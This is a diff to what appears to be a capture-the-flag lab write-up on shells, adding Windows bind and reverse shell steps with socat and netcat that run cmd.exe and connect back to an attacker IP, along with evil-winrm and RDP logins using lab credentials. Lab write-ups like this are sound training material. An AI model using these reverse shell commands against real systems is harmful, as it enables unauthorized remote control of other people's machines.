@@ -668,7 +668,7 @@ The remainder of this task will consist of shell examples for you to try out on 
 
 		![task13-edit-php](./images/task13-edit-php.png)
 
-	* Upload file to to targer machine via browser upload 
+	* Upload file to to target machine via browser upload 
 
 		![task13-upload-rshell](./images/task13-upload-rshell.png)
 
@@ -792,15 +792,42 @@ The remainder of this task will consist of shell examples for you to try out on 
 
 	#### Socat techniques
 
-		* Bind shell
+	* Bind shell
 
-		* Reverse shell
+		* Step 1 login to target machine = `evil-winrm -i $IP -u Administrator -p 'TryH4ckM3!'`
+		* Step 2 on target machine = `socat TCP-L:8888 EXEC:cmd.exe,pipes`
+		* Step 3 on our machine = `socat TCP:$IP:8888 -`
+			
+		![task13-win-socat-bind](./images/task13-win-socat-bind.png)
+
+	* Reverse shell
+
+		* Step 1 on our machine = `socat TCP-L:9999 -`
+		* Step 2 login to target machine = `evil-winrm -i $IP -u Administrator -p 'TryH4ckM3!'`
+		* Step 3 on target machine = `socat TCP:10.13.52.88:9999 EXEC:cmd.exe,pipes`
+
+		![task13-win-socat-reverse](./images/task13-win-socat-reverse.png)
 
 	#### Netcat techniques
 
-		* Bind shell
+	* Bind shell
 
-		* Reverse shell
+		* Step 1 login on target machine = `xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:$IP /u:Administrator /p:'TryH4ckM3!'` and set listener `nc -nvlp 8888 -e "cmd.exe"`
+
+			![task13-win-listener](./images/task13-win-listener.png)
+
+		* Step 2 on our machine = `nc $IP 8888`
+
+			![task13-win-nc-bind](./images/task13-win-nc-bind.png)
+
+	* Reverse shell
+
+		* Step 1 login to target machine = `evil-winrm -i $IP -u Administrator -p 'TryH4ckM3!'`
+		* Step 2 on our machine = `rlwrap nc -lvnp 9999`
+		* Step 3 on target machine = `nc 10.13.52.88 9999 -e “cmd.exe”`
+
+		![task13-win-nc-reverse](./images/task13-win-nc-reverse.png)
+
 
 * Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.
 
